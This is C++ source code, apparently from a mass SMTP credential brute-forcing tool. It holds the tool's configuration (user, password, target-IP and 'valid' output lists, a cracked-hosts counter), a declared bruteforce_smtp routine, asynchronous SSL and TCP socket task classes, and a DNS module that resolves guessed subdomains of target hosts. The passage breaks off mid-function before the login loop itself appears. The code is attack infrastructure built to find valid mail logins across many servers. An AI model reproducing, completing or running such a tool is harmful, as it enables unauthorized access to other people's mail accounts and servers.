#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <math.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/sysinfo.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

#include <iostream>
#include <fstream>
#include <map>
#include <vector>
#include <set>
#include <typeinfo>
#include <functional>
#include <memory>
#include <algorithm>
#include <atomic>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <cstring>

#ifndef globs_h__
#define globs_h__


//#define _D_SMTP_OVER_SSL

#define _D_IPS_ARE_DOMAINS

//#define _D_DOMAIN_FROM_BANNER

struct globs_t {
	struct {
		int debug = 1;
		int number_of_threads = 0;
		int max_concurrent_connections = 0;
		int port_number = 0;
		int connection_timeout_sec = 30;
		bool log_bad = false;
		bool use_simple_username = false;
		bool print_stat = false;
	} cfg;

	const char* bad_filename = "bad.txt";
	const char* valid_filename = "valid.txt";
	const char* subs_filename = "subs.txt";
	const char* users_filename = "users.txt";
	const char* pass_filename = "pass.txt";
	const char* hosts_filename = "ips.txt";
	const char* hosts_cache_filename = "ips_hosts_cache.txt";
	const char* local_ips_filename = "local_ips.txt";

	std::vector<char*> nameservers;
	std::vector<char*> subdomains;


	std::atomic<int64_t> processed_tasks_counter;
	std::atomic<int> running_tasks_counter;
	std::atomic<int64_t> established_connections_counter;
	std::atomic<int> running_connections_counter;
	std::atomic<int64_t> login_attempts_counter;
	std::atomic<int> tcpandsll_errors_counter;
	std::atomic<int> connect_errors_counter;

	std::atomic<int> good_domains_counter;
	std::atomic<int> checked_domains_counter;
	std::atomic<int> domains_from_cache_counter;
	std::atomic<int> dns_timeout_error_counter;
	std::atomic<int> running_dns_counter;

	std::atomic<int> cracked_hosts_counter;
	std::atomic<int> smtp_error_counter;
	std::atomic<int> timeout_counter;

	globs_t() :
		processed_tasks_counter(0),
		running_tasks_counter(0),
		established_connections_counter(0),
		running_connections_counter(0),
		login_attempts_counter(0),
		tcpandsll_errors_counter(0),
		connect_errors_counter(0),
		good_domains_counter(0),
		checked_domains_counter(0),
		domains_from_cache_counter(0),
		dns_timeout_error_counter(0),
		running_dns_counter(0),
		cracked_hosts_counter(0),
		smtp_error_counter(0),
		timeout_counter(0)
	{

	}
};

extern globs_t globs;

#endif // globs_h__

#ifndef utils_h__
#define utils_h__



int base64_encode(const char* in_buf, int in_size, char* out_buf, int out_capacity);
void free_words(void* ptr);
void* read_words(const char* fname, std::vector<char*>& words);
bool replace(std::string& str, const std::string& from, const std::string& to);
void capitalize(const char* from, char* to);
bool are_coprime(unsigned a, unsigned b);
bool ends_with(const char* str, int str_len, const char* suffix, int suffix_len);
void uppercase(const char* from, char* to);
void read_cracked_ips(const char* fname, std::map<uint32_t, int>& map);
void format_time_left(double sec_left, char* str, int str_size);


time_t get_current_time();
void set_handles_limit(int nmax);
bool hostname_to_ip(const char * hostname, char* ip);
uint32_t hostname_to_addr(const char * hostname);


void CRYPTO_thread_setup(void);

void init_OpenSSL();

#endif // utils_h__

#ifndef resolver_h__
#define resolver_h__


bool resolve_domains(std::vector<char*>& hosts, std::vector<sockaddr_in>& hosts_addr);


#endif // resolver_h__

#ifndef scheduler_h__
#define scheduler_h__


class scheduler_task {
public:
	virtual void try_to_connect() {};
	virtual bool try_to_complete() = 0;
	virtual scheduler_task* get_primary_task() { return nullptr; };
	virtual int get_socket() = 0;
	virtual bool try_to_complete_by_timeout() { return true; }

	virtual ~scheduler_task() {}
};

class task_manager {
public:
	virtual int64_t pending_tasks_count() = 0;
	virtual scheduler_task* get_next_task() = 0;
	virtual void on_task_completed_callback(scheduler_task*, bool timeout) = 0;
};

struct scheduler_params {
	int startup_portion_size = 700;
	int seconds_before_next_portion = 1;
	int task_timeout_in_seconds = 30;
	int max_running_tasks = 1;
};

void scheduler_execute_tasks_async(task_manager& tasks, int number_of_threads, const scheduler_params params);

#endif // scheduler_h__

#ifndef socket_task_h__
#define socket_task_h__


class ssl_socket_task : public scheduler_task {

	enum
	{
		step_ssl_connect,
		step_ssl_read,
		step_ssl_write,
		step_finish = -1
	};

	int _current_step = step_finish;

	// SSL context
	SSL* _ssl = nullptr;
	SSL_CTX *_ssl_ctx = nullptr;

	// socket context
	const sockaddr_in* _destaddr;
	const sockaddr_in* _localaddr;
	int _sock = 0;

	// read / write task context

	struct {
		const char* write_buf = nullptr;
		int write_size = 0;
		char* read_buf = nullptr;
		int read_size = 0;
		std::function<void(int)> on_success_callback;
	} _io_task;

	void do_step_ssl_connect() {
		int ret_code = SSL_connect(_ssl);
		if (is_ssl_await_required(_ssl, ret_code))
			return;

		//std::cout << "Successfully established SSL/TLS session." << std::endl;

		change_step_to(step_finish);
		on_connected_callback();
	}

	void do_step_ssl_read() {
		if (!_io_task.read_buf || !_io_task.read_size) {
			std::cerr << "Error: try_ssl_read" << std::endl;
			exit(0);
		}

		int ret = SSL_read(_ssl, _io_task.read_buf, _io_task.read_size);
		if (is_ssl_await_required(_ssl, ret))
			return;

		//std::cout << "SSL_read bytes: " << ret << std::endl;

		_io_task.read_buf = nullptr;
		_io_task.read_size = 0;

		// check if we need to complete Write task too
		if (_io_task.write_buf) {
			change_step_to(step_ssl_write);
			do_step_ssl_write();
		}
		else {
			change_step_to(step_finish);
			_io_task.on_success_callback(ret);
		}
	}

	void do_step_ssl_write() {
		if (!_io_task.write_buf || !_io_task.write_size) {
			std::cerr << "Error: try_ssl_write" << std::endl;
			exit(0);
		}

		int ret = SSL_write(_ssl, _io_task.write_buf, _io_task.write_size);
		if (is_ssl_await_required(_ssl, ret))
			return;

		_io_task.write_buf = nullptr;
		_io_task.write_size = 0;

		// check if we need to complete Read task too
		if (_io_task.read_buf) {

			change_step_to(step_ssl_read);

			do_step_ssl_read();
		}
		else {
			// this code can't be reached..
			change_step_to(step_finish);

			_io_task.on_success_callback(0);
		}
	}

	bool is_ssl_await_required(const SSL *s, int ret_code) {

		if (ret_code > 0)
			return false;

		int error = SSL_get_error(s, ret_code);

		if (error == SSL_ERROR_WANT_READ) {
			return true;
		}
		else if (error == SSL_ERROR_WANT_WRITE) {
			return true;
		}

		// Some network error occurs, TCP or SSL

		globs.tcpandsll_errors_counter++;

		change_step_to(step_finish);

		return true;
	}


	inline bool on_step(int step) {
		return step == _current_step;
	}

	inline void change_step_to(int step) {
		_current_step = step;
	}

	// sheduler_task methods implementation

	virtual bool try_to_complete() override {

		if (on_step(step_ssl_connect))
		{
			do_step_ssl_connect();
		}
		else if (on_step(step_ssl_read))
		{
			do_step_ssl_read();
		}
		else if (on_step(step_ssl_write))
		{
			do_step_ssl_write();
		}

		return on_step(step_finish);
	}

	virtual void try_to_connect() override {

		// (ret == -1 && errno == EINPROGRESS) is OK for nonblock sockets
		int ret = connect(_sock, (sockaddr*)_destaddr, sizeof(sockaddr_in));

		if (ret != 0 && errno != EINPROGRESS) {
			globs.connect_errors_counter++;
			return;
		}

		_ssl_ctx = SSL_CTX_new(SSLv23_client_method());
		if (!_ssl_ctx) {
			std::cerr << "Error: Unable to create a new SSL context structure." << std::endl;
			return;
		}

		_ssl = SSL_new(_ssl_ctx);
		if (!_ssl) {
			std::cerr << "Error creating SSL." << std::endl;
			return;
		}

		if (!SSL_set_fd(_ssl, _sock)) {
			std::cerr << "Error SSL_set_fd." << std::endl;
			return;
		}

		change_step_to(step_ssl_connect);
	}

	virtual int get_socket() override {
		return _sock;
	}

public:


	ssl_socket_task(const sockaddr_in* destaddr, const sockaddr_in * localaddr = nullptr) :
		_destaddr(destaddr), _localaddr(localaddr) {

		_sock = socket(AF_INET, SOCK_STREAM, 0);

		if (_sock <= 0) {
			std::cerr << "Failed create socket: " << strerror(errno) << std::endl;
			std::cerr << "Please run the program with N threads <= Max open files (ulimits -n)" << std::endl;
			exit(0);//Terminate. You should run the program with N threads <= N max open files (ulimits -n) for the system.
		}

		// setup local address
		if (localaddr) {
			const int one = 1;
			setsockopt(_sock, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
			bind(_sock, (struct sockaddr *) localaddr, sizeof(sockaddr_in));
		}
	}

	~ssl_socket_task()
	{
		if (_sock)
			close(_sock);

		if (_ssl)
			SSL_free(_ssl);

		if (_ssl_ctx)
			SSL_CTX_free(_ssl_ctx);
	}

	void send_recv_async(const char* send_buf, int send_size, char* recv_buf, int recv_size,
		std::function<void(int)> callback) {

		_io_task.write_buf = send_buf;
		_io_task.write_size = send_size;

		_io_task.read_buf = recv_buf;
		_io_task.read_size = recv_size;

		_io_task.on_success_callback = std::move(callback);

		if (!send_buf) {
			change_step_to(step_ssl_read);
			do_step_ssl_read();
		}
		else {
			change_step_to(step_ssl_write);
			do_step_ssl_write();
		}
	}

	void recv_async(char* recv_buf, int recv_size,
		std::function<void(int)> callback) {

		send_recv_async(nullptr, 0, recv_buf, recv_size, callback);

	}

	virtual void on_connected_callback() = 0;
};


class socket_task : public scheduler_task {

	enum
	{
		step_ssl_connect,
		step_ssl_read,
		step_ssl_write,
		step_finish = -1
	};

	int _current_step = step_finish;

	// socket context
	const sockaddr_in* _destaddr;
	int _sock = 0;

	// read / write task context

	struct {
		const char* write_buf = nullptr;
		int write_size = 0;
		char* read_buf = nullptr;
		int read_size = 0;
		std::function<void(int)> on_success_callback;
	} _io_task;

	void do_step_ssl_connect() {
		change_step_to(step_finish);
		on_connected_callback();
	}

	void do_step_ssl_read() {
		if (!_io_task.read_buf || !_io_task.read_size) {
			std::cerr << "Error: try_ssl_read" << std::endl;
			exit(0);
		}

		int ret = recv(_sock, _io_task.read_buf, _io_task.read_size, 0);
		if (is_await_required(ret))
			return;

		//std::cout << "SSL_read bytes: " << ret << std::endl;

		_io_task.read_buf = nullptr;
		_io_task.read_size = 0;

		// check if we need to complete Write task too
		if (_io_task.write_buf) {
			change_step_to(step_ssl_write);
			do_step_ssl_write();
		}
		else {
			change_step_to(step_finish);
			_io_task.on_success_callback(ret);
		}
	}

	void do_step_ssl_write() {
		if (!_io_task.write_buf || !_io_task.write_size) {
			std::cerr << "Error: try_ssl_write" << std::endl;
			exit(0);
		}

		int ret = send(_sock, _io_task.write_buf, _io_task.write_size, 0);
		if (is_await_required(ret))
			return;

		// partial write
		if (ret < _io_task.write_size) {
			_io_task.write_buf += ret;
			_io_task.write_size -= ret;
			return;
		}

		_io_task.write_buf = nullptr;
		_io_task.write_size = 0;

		// check if we need to complete Read task too
		if (_io_task.read_buf) {

			change_step_to(step_ssl_read);

			do_step_ssl_read();
		}
		else {
			// this code can't be reached..
			change_step_to(step_finish);

			_io_task.on_success_callback(0);
		}
	}

	inline bool is_await_required(int ret_code) {

		if (ret_code > 0)
			return false;

		if (ret_code == -1 &&
			((errno == EAGAIN) || (errno == EWOULDBLOCK)))
			return true;

		// Some network error occurs, TCP or SSL

		globs.tcpandsll_errors_counter++;

		change_step_to(step_finish);

		return true;
	}


	inline bool on_step(int step) {
		return step == _current_step;
	}

	inline void change_step_to(int step) {
		_current_step = step;
	}

	// sheduler_task methods implementation

	virtual bool try_to_complete() override {

		//std::cout << "try_to_complete: " << _current_step << std::endl;

		if (on_step(step_ssl_connect))
		{
			do_step_ssl_connect();
		}
		else if (on_step(step_ssl_read))
		{
			do_step_ssl_read();
		}
		else if (on_step(step_ssl_write))
		{
			do_step_ssl_write();
		}

		return on_step(step_finish);
	}

	virtual void try_to_connect() override {

		// (ret == -1 && errno == EINPROGRESS) is OK for nonblock sockets
		int ret = connect(_sock, (sockaddr*)_destaddr, sizeof(sockaddr_in));

		if (ret != 0 && errno != EINPROGRESS) {
			globs.connect_errors_counter++;
			return;
		}

		change_step_to(step_ssl_connect);
	}

	virtual int get_socket() override {
		return _sock;
	}

public:

	socket_task(const sockaddr_in* destaddr, const sockaddr_in * localaddr = nullptr) :
		_destaddr(destaddr) {

		_sock = socket(AF_INET, SOCK_STREAM, 0);

		if (_sock <= 0) {
			std::cerr << "Failed create socket: " << strerror(errno) << std::endl;
			std::cerr << "Please run the program with N threads <= Max open files (ulimits -n)" << std::endl;
			exit(0);//Terminate. You should run the program with N threads <= N max open files (ulimits -n) for the system.
		}

		// setup local address
		if (localaddr) {
			const int one = 1;
			setsockopt(_sock, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
			bind(_sock, (struct sockaddr *) localaddr, sizeof(sockaddr_in));
		}
	}

	~socket_task()
	{
		if (_sock)
			close(_sock);

	}

	void send_recv_async(const char* send_buf, int send_size, char* recv_buf, int recv_size,
		std::function<void(int)> callback) {

		_io_task.write_buf = send_buf;
		_io_task.write_size = send_size;

		_io_task.read_buf = recv_buf;
		_io_task.read_size = recv_size;

		_io_task.on_success_callback = std::move(callback);

		if (!send_buf) {
			change_step_to(step_ssl_read);
			do_step_ssl_read();
		}
		else {
			change_step_to(step_ssl_write);
			do_step_ssl_write();
		}
	}

	void recv_async(char* recv_buf, int recv_size,
		std::function<void(int)> callback) {

		send_recv_async(nullptr, 0, recv_buf, recv_size, callback);

	}

	virtual void on_connected_callback() = 0;
};


#endif // socket_task_h__

#ifndef dns_task_h__
#define dns_task_h__

namespace dns_helper {

	//DNS header structure
	struct DNS_HEADER
	{
		unsigned short id; // identification number

		unsigned char rd : 1; // recursion desired
		unsigned char tc : 1; // truncated message
		unsigned char aa : 1; // authoritive answer
		unsigned char opcode : 4; // purpose of message
		unsigned char qr : 1; // query/response flag

		unsigned char rcode : 4; // response code
		unsigned char cd : 1; // checking disabled
		unsigned char ad : 1; // authenticated data
		unsigned char z : 1; // its z! reserved
		unsigned char ra : 1; // recursion available

		unsigned short q_count; // number of question entries
		unsigned short ans_count; // number of answer entries
		unsigned short auth_count; // number of authority entries
		unsigned short add_count; // number of resource entries
	};

	int build_request_A(const char *domain, unsigned char* buf);

	uint32_t extract_ipaddr(unsigned char* buf, int bufsize, const char* domain);

	inline DNS_HEADER* to_header(void* ptr) {
		return  (DNS_HEADER *)ptr;
	}
}


class dns_task : public scheduler_task {
	enum
	{
		step_send_request,
		step_recive_response,
		step_finish = -1
	};

	int _current_step = step_send_request;
	int _attempts_left = 3;
	const int _subdomain;
	char _domain[100];

	int _sock = 0;

	const char* _hostname;
	struct sockaddr_in _DNSserver;
	uint32_t _hostaddress = 0;
	const int _hostindex = 0;
	bool _got_response = false;

	char* _dns_serv;

	inline bool on_step(int step) {
		return step == _current_step;
	}

	inline void change_step_to(int step) {
		_current_step = step;
	}

	void do_step_send_request() {
		unsigned char buf[65536];

		strncpy(_domain, globs.subdomains[_subdomain], sizeof(_domain) - 1);
		strncat(_domain, _hostname, sizeof(_domain) - 1);

		int rindex = rand() % (globs.nameservers.size());
		_DNSserver.sin_family = AF_INET;
		_DNSserver.sin_port = htons(53);
		_DNSserver.sin_addr.s_addr = inet_addr(globs.nameservers[rindex]);
		_dns_serv = globs.nameservers[rindex];

		int size = dns_helper::build_request_A(_domain, buf);

		dns_helper::to_header(buf)->id = rand();

		int ret = sendto(_sock, buf, size, 0, (struct sockaddr*)&_DNSserver, sizeof(_DNSserver));
		if (is_await_required(ret))
			return;

		change_step_to(step_recive_response);
	}

	void do_step_recive_response() {
		unsigned char buf[10000];

		int ret = recv(_sock, buf, sizeof(buf) - 100, 0);
		if (is_await_required(ret))
			return;

		int RCode = dns_helper::to_header(buf)->rcode;

		// Mark that we got response from server
		_got_response = true;

		if (0 == RCode) { // DNS Query completed successfully
			buf[ret] = 0;

			// Save the IP address.
			_hostaddress = dns_helper::extract_ipaddr(buf, ret, _domain);

		}
		else if (5 == RCode) {
			_got_response = false;
			// The server refused to answer for the query
			// Try again with another server
			//std::cout << "ERROR: 5 == RCode " << _dns_serv << std::endl;

			change_step_to(step_send_request);
			do_step_send_request();
			return;
		}

		// process response
		change_step_to(step_finish);
	}


	inline bool is_await_required(int ret_code) {

		if (ret_code > 0)
			return false;

		if (ret_code == -1 &&
			((errno == EAGAIN) || (errno == EWOULDBLOCK)))
			return true;


		change_step_to(step_finish);

		return true;
	}

	virtual bool try_to_complete() override {

		//std::cout << "try_to_complete " << std::endl;


		if (on_step(step_send_request))
		{
			do_step_send_request();
		}
		else if (on_step(step_recive_response))
		{
			do_step_recive_response();
		}

		return on_step(step_finish);
	}

	virtual bool try_to_complete_by_timeout() override {

		if (on_step(step_recive_response) && _attempts_left > 0) {

			_attempts_left--;
			change_step_to(step_send_request);
			do_step_send_request();
			return false;
		}

		return true;
	}

	virtual scheduler_task* get_primary_task() override {

		if (_hostaddress)
			return nullptr;

		if (_subdomain >= globs.subdomains.size() - 1)
			return nullptr;

		return new dns_task(_subdomain + 1, _hostname, _hostindex);
	}

	virtual int get_socket() override {
		return _sock;
	}

public:

	dns_task(int sd, const char* hn, int hostindex) :
		_subdomain(sd), _hostname(hn), _hostindex(hostindex) {

		_sock = socket(AF_INET, SOCK_DGRAM, 0);

		if (_sock <= 0) {
			std::cerr << "Failed create socket: " << strerror(errno) << std::endl;
			std::cerr << "Please run the program with N threads <= Max open files (ulimits -n)" << std::endl;
			exit(0);//Terminate. You should run the program with N threads <= N max open files (ulimits -n) for the system.
		}

		if (_subdomain >= globs.subdomains.size()) {
			std::cerr << "Wrong subdomain index" << _subdomain << std::endl;
			exit(0);
		}

	}

	~dns_task() {
		if (_sock)
			close(_sock);

	}

	uint32_t hostaddress() {
		return _hostaddress;
	}

	uint32_t hostindex() {
		return _hostindex;
	}

	int subdomain() {
		return _subdomain;
	}

	const char* domain() {
		return _domain;
	}

	bool got_response() {
		return _got_response;
	}
};




#endif // dns_task_h__


#ifndef smtp_bruteforcer_h__
#define smtp_bruteforcer_h__

typedef std::vector<char*> vector_pchar;

struct brute_inputs {
	std::vector<char*> users;
	std::vector<char*> passchains;
	std::vector<char*> hosts;
	std::vector<sockaddr_in> hosts_addr;
};

void bruteforce_smtp(brute_inputs& data);

void init_smtp_bruteforcer();


#endif // smtp_bruteforcer_h__


#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <math.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/sysinfo.h>
#include <sys/resource.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

#include <iostream>
#include <fstream>
#include <map>
#include <vector>
#include <set>
#include <typeinfo>
#include <functional>
#include <memory>
#include <algorithm>
#include <atomic>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <cstring>

#ifndef TCAD_CAPTURE_DNS_EXTRACTOR_H
#define TCAD_CAPTURE_DNS_EXTRACTOR_H

/*
 * This module extracts some useful data from a DNS message.
 *
 * for introduction of DNS types, see:
 *  https://en.wikipedia.org/wiki/List_of_DNS_record_types
 *
 * for specification of DNS message format, see:
 * 	https://tools.ietf.org/html/rfc1034
 * 	https://tools.ietf.org/html/rfc1035
 */


#ifdef __cplusplus
extern "C" {
#endif

#ifndef likely
#define likely(x)       (x)
#endif
#ifndef unlikely
#define unlikely(x)     (x)
#endif
#ifndef min
#define min(x, y) ((x)<(y))?(x):(y)
#endif


	typedef struct {
		uint32_t qr : 1; // 0 for query, 1 for response
		uint32_t rd : 1; // recursion desired
		uint32_t ra : 1; // recursion available
		uint32_t aa : 1; // authoritative answer
		uint32_t rcode : 4; // return code
		uint32_t dns_id : 16;//query identification
		uint32_t qtype : 16;//query id
		uint32_t rrtype : 16;//rr type
		uint16_t l_domain;//length of valid data in p_domain(see below)
		uint16_t l_value;//length of valid data in p_value(see below)
		uint32_t ttl;//expiration time of rr data
#define DNS_EXTRACTOR_DOMAIN_LEN_MAX 256
		uint8_t p_domain[DNS_EXTRACTOR_DOMAIN_LEN_MAX];//domain name
#define DNS_EXTRACTOR_VALUE_LEN_MAX 256
		uint8_t p_value[DNS_EXTRACTOR_VALUE_LEN_MAX];//rr answer data
	} __attribute__((aligned(8))) dns_access_info_t;

	typedef struct {
#if __BYTE_ORDER == __LITTLE_ENDIAN
		uint8_t rd : 1;
		uint8_t tc : 1;
		uint8_t aa : 1;
		uint8_t opcode : 4;
		uint8_t qr : 1;
		uint8_t rcode : 4;
		uint8_t zero : 3;
		uint8_t ra : 1;
#elif __BYTE_ORDER == __BIG_ENDIAN
		uint8_t qr : 1;
		uint8_t opcode : 4;
		uint8_t aa : 1;
		uint8_t tc : 1;
		uint8_t rd : 1;
		uint8_t ra : 1;
		uint8_t zero : 3;
		uint8_t rcode : 4;
#else
# error	"Please fix <bits/endian.h>"
#endif
	}__dns_flag_t;


#if __BYTE_ORDER == __LITTLE_ENDIAN
#define __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p) (((*(uint8_t*)(p))<<8) | (*((uint8_t*)(p)+1)))
#define __DNS_EXTRACTOR_ASSIGH_VAR4_FROM_PKT(p) (((*(uint8_t*)(p))<<24) | ((*((uint8_t*)(p)+1))<<16) | ((*((uint8_t*)(p)+2))<<8) | (*((uint8_t*)(p)+3)))
#else
#define __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p) *(uint16_t*)p
#define __DNS_EXTRACTOR_ASSIGH_VAR4_FROM_PKT(p) *(uint32_t*)p
#endif


#define __DNS_EXTRACTOR_SKIP_N(p, nskip) { (p) += (nskip); if (unlikely((uint64_t)p >= (uint64_t)msg_end)) return;/*check against out-of-bound*/ }

#define __DNS_EXTRACTOR_SKIP_DOMAIN_NAME(p) { while(*p && *p < 192) __DNS_EXTRACTOR_SKIP_N(p, *p+1); if (*p) __DNS_EXTRACTOR_SKIP_N(p, 2); }

#define __DNS_EXTRACTOR_SKIP_QUESTION(p) { __DNS_EXTRACTOR_SKIP_DOMAIN_NAME(p); __DNS_EXTRACTOR_SKIP_N(p, 4); }

#define __DNS_EXTRACTOR_EXTRACT_DOMAIN_NAME(from, to, len, maxlen, msg) {\
		if (msg_end - from < 6/*min query section len*/) return;/*if domain name truncated*/ \
		uint8_t domain_compressed = 0; \
		uint8_t *p_rd = from; \
		uint8_t *p_wr = to; \
		while (*p_rd) { \
			if (*p_rd >= 192) { \
				if (!domain_compressed) { \
					__DNS_EXTRACTOR_SKIP_N(from, 2);\
					domain_compressed = 1; \
				} \
				uint16_t offset = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p_rd) - 49152; \
				p_rd = msg;\
				__DNS_EXTRACTOR_SKIP_N(p_rd, offset);\
			} else { \
				uint8_t label_len = *p_rd++; \
				if (msg_end - p_rd < (label_len + 1)) return;/*truncated*/\
				if (!domain_compressed) __DNS_EXTRACTOR_SKIP_N(from, label_len + 1); \
				uint32_t left_octets_wr = maxlen - (p_wr - to); \
				label_len = min(label_len, left_octets_wr); \
				while (label_len-- > 0) *p_wr++ = *p_rd++; \
				*p_wr++ = '.'; \
			} \
		} \
		if (!domain_compressed) __DNS_EXTRACTOR_SKIP_N(from, 1);/*skip last zero-length label '0'*/ \
		if (p_wr != to) p_wr--;/*trim trailing dot as conventional*/ \
		len = p_wr - to; \
}



	static void extract_dns_access_info(uint8_t *msg, size_t len, dns_access_info_t *access)
	{
		/*
		 * DNS id, flags, answer counts : 12 bytes
		 * minimum length of domain name: set to 2
		 * minimum length of query section: 2+4=6
		 * minimum length of answer section: 2+8+2+0=12
		 * minimum query message length: 12 + 6 = 18
		 * minimum response message length: 12 + 6 + 12 = 30
		 * */
		if (unlikely(!msg || len < 18)) {
			access->dns_id = 0;
			return;
		}

		access->dns_id = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(msg);
		__dns_flag_t *flags = (__dns_flag_t*)(msg + 2);
		access->rd = flags->rd;
		access->ra = flags->ra;
		access->qr = flags->qr;
		access->aa = flags->aa;
		access->rcode = flags->rcode;

		uint8_t *p = msg + 4;
		uint16_t n_questions = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p);
		p += 2;
		uint16_t n_answers = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p);
		uint8_t *msg_end = msg + len;

		access->l_domain = 0;
		access->l_value = 0;
		p = msg + 12;
		if (n_questions) {
			__DNS_EXTRACTOR_EXTRACT_DOMAIN_NAME(p, access->p_domain, access->l_domain, DNS_EXTRACTOR_DOMAIN_LEN_MAX, msg);
			access->qtype = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p);
			p += 4;
			while (n_questions-- > 1) __DNS_EXTRACTOR_SKIP_QUESTION(p);
		}
		else {
			access->qtype = 0;
			access->rrtype = 0;
			access->ttl = 0;
			return; //no question section
		}

		if (!n_answers) {
			access->rrtype = 0;
			access->ttl = 0;
			return;
		}

		/*min domain name len: 2; min rr len:12*/
		int answer_id;
		int first_answer = -1;//first answer rr with rrtype == qtype
		uint8_t *answer_start = p;
		for (answer_id = 0; answer_id < n_answers && p - msg + 12 < len; ++answer_id) {
			__DNS_EXTRACTOR_SKIP_DOMAIN_NAME(p);
			uint16_t rrtype = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p);
			if (rrtype == access->qtype) {
				first_answer = answer_id;
				break;
			}
			p += 8;//skip rrtype, class, ttl
			p += __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p) + 2;
			__DNS_EXTRACTOR_SKIP_N(p, 0);//out-of-range check
		}

		p = answer_start;
		for (answer_id = 0; answer_id < n_answers && p - msg + 12 < len; ++answer_id) {
			__DNS_EXTRACTOR_SKIP_DOMAIN_NAME(p);
			uint16_t rrtype = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p);
			if (rrtype != access->qtype && first_answer >= 0) { //skip irrelevant rr
				p += 8;//skip rrtype, class, ttl
				p += __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p) + 2;
				continue;
			}
			access->rrtype = rrtype;
			if (answer_id == first_answer || first_answer == -1) {
				p += 4;//skip rrtype and class
				access->ttl = __DNS_EXTRACTOR_ASSIGH_VAR4_FROM_PKT(p);
				p += 4;//skip ttl
			}
			else {
				p += 8;
			}
			uint16_t rdata_len = __DNS_EXTRACTOR_ASSIGH_VAR2_FROM_PKT(p);
			p += 2;//skip rdata_len

			uint8_t *p_value = access->p_value + access->l_value;
			uint16_t left_octets_rd = len - (p - msg), left_octets_wr = sizeof(access->p_value) - access->l_value - 1;
			if (answer_id != first_answer && first_answer >= 0 && left_octets_wr > 0) *p_value++ = ';';
			rdata_len = min(rdata_len, left_octets_rd);

			/*for type 2,5,6,12,15, rdata is a domain name. consider create a bitmap 0x9064*/
			if (unlikely(rrtype == 15/*MX*/)) {
				p += 2;//skip preference
				uint16_t l_value;
				__DNS_EXTRACTOR_EXTRACT_DOMAIN_NAME(p, p_value, l_value, left_octets_wr, msg);
				p_value += l_value;
			}
			else if (unlikely(rrtype == 2/*NS*/ || rrtype == 12 /*PTR*/ || rrtype == 5/*CNAME*/ || rrtype == 6/*SOA*/)) {
				uint16_t l_value;
				__DNS_EXTRACTOR_EXTRACT_DOMAIN_NAME(p, p_value, l_value, left_octets_wr, msg);
				p_value += l_value;
			}
			else {
				rdata_len = min(rdata_len, left_octets_wr);
				while (rdata_len-- > 0) *p_value++ = *p++;
			}
			access->l_value = p_value - access->p_value;

			if (first_answer == -1) break;
		}
	}

#ifdef __cplusplus
}
#endif

#endif



namespace dns_helper {
	//Types of DNS resource records :)

#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server

//Function Prototypes
	void ChangetoDnsNameFormat(unsigned char*, unsigned char*);

	//Constant sized fields of query structure
	struct QUESTION
	{
		unsigned short qtype;
		unsigned short qclass;
	};

	//Constant sized fields of the resource record structure
#pragma pack(push, 1)
	struct R_DATA
	{
		unsigned short type;
		unsigned short _class;
		unsigned int ttl;
		unsigned short data_len;
	};
#pragma pack(pop)

	//Pointers to resource record contents
	struct RES_RECORD
	{
		unsigned char *name;
		struct R_DATA *resource;
		unsigned char *rdata;
	};

	//Structure of a Query
	typedef struct
	{
		unsigned char *name;
		struct QUESTION *ques;
	} QUERY;

	// 65536
	int build_request_A(const char *domain, unsigned char* buf) {
		unsigned char hostname[100];
		unsigned char *qname, *reader;
		int i, j, stop;

		strcpy((char*)hostname, domain);

		struct sockaddr_in a;

		struct RES_RECORD answers[20], auth[20], addit[20]; //the replies from the DNS server

		struct DNS_HEADER *dns = NULL;
		struct QUESTION *qinfo = NULL;

		//Set the DNS structure to standard queries
		dns = (struct DNS_HEADER *)buf;

		dns->id = (unsigned short)htons(rand());
		dns->qr = 0; //This is a query
		dns->opcode = 0; //This is a standard query
		dns->aa = 0; //Not Authoritative
		dns->tc = 0; //This message is not truncated
		dns->rd = 1; //Recursion Desired
		dns->ra = 0; //Recursion not available! hey we dont have it (lol)
		dns->z = 0;
		dns->ad = 0;
		dns->cd = 0;
		dns->rcode = 0;
		dns->q_count = htons(1); //we have only 1 question
		dns->ans_count = 0;
		dns->auth_count = 0;
		dns->add_count = 0;

		unsigned char* pos = (unsigned char*)&buf[sizeof(struct DNS_HEADER)];

		//point to the query portion
		qname = pos;
		ChangetoDnsNameFormat(qname, hostname);
		qinfo = (struct QUESTION*)&pos[(strlen((const char*)qname) + 1)]; //fill it
		qinfo->qtype = htons(T_A); //type of the query , A , MX , CNAME , NS etc
		qinfo->qclass = htons(1); //its internet (lol)

		pos += (strlen((const char*)qname) + 1) + sizeof(struct QUESTION);

		return pos - buf;
	}

	uint32_t extract_ipaddr(unsigned char* buf, int bufsize, const char* domain)
	{
		dns_access_info_t info = { 0 };

		extract_dns_access_info(buf, bufsize, &info);

		if (info.qr &&
			info.rrtype == T_A &&
